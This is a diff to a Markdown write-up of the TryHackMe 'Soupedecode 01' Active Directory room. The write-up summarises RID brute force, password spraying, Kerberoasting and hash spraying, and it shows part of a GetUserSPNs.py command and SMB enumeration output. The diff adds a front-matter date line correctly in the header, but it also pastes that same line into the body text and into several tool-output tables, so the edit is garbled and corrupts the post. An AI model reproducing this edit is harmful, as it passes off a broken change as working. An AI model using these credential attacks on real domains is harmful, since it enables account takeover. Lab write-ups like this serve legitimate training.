@@ -1,4 +1,5 @@
 ﻿---
+date: 2024-11-11 00:00:00 +0100
 title: 'TryHackMe - Soupedecode 01'
 author : Matty
 categories: [TryHackMe]
@@ -9,6 +10,7 @@ image:
   path: room_image.webp
 ---
 
+date: 2024-11-11 00:00:00 +0100
 **Soupedecode 01** was a very simple Active Directory room. We began by enumerating a list of usernames via **RID bruteforce** and subsequently found valid credentials through **password spraying**. After that, using a **Kerberoasting** attack yielded credentials for a service account, granting access to an SMB share containing usernames and NTLM hashes. Finally, by spraying the hashes, we discovered the credentials of an administrator account on the **Domain Controller (DC)** and completed the room.
 
 [![Tryhackme Room Link](/images/tryhackme_soupedecode_01/room_card.webp)](https://tryhackme.com/room/soupedecode01){: .center }
@@ -59,6 +61,7 @@ SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\guest:
 SMB         10.10.67.33     445    DC01             [*] Enumerated shares
 SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
 SMB         10.10.67.33     445    DC01             -----           -----------     ------
+date: 2024-11-11 00:00:00 +0100
 SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
 SMB         10.10.67.33     445    DC01             backup
 SMB         10.10.67.33     445    DC01             C$                              Default share
@@ -121,6 +124,7 @@ SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\ybob31
 SMB         10.10.67.33     445    DC01             [*] Enumerated shares
 SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
 SMB         10.10.67.33     445    DC01             -----           -----------     ------
+date: 2024-11-11 00:00:00 +0100
 SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
 SMB         10.10.67.33     445    DC01             backup
 SMB         10.10.67.33     445    DC01             C$                              Default share
@@ -154,6 +158,7 @@ $ GetUserSPNs.py -request -outputfile kerberoastables.txt 'SOUPEDECODE.LOCAL/ybo
 
 ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation
 ----------------------  --------------  --------  --------------------------  ---------  ----------
+date: 2024-11-11 00:00:00 +0100
 FTP/FileServer          file_svc                  2024-06-17 17:32:23.726085  <never>
 FW/ProxyServer          firewall_svc              2024-06-17 17:28:32.710125  <never>
 HTTP/BackupServer       backup_svc                2024-06-17 17:28:49.476511  <never>
@@ -181,6 +186,7 @@ SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\file_s
 SMB         10.10.67.33     445    DC01             [*] Enumerated shares
 SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
 SMB         10.10.67.33     445    DC01             -----           -----------     ------
+date: 2024-11-11 00:00:00 +0100
 SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
 SMB         10.10.67.33     445    DC01             backup          READ
 SMB         10.10.67.33     445    DC01             C$                              Default share
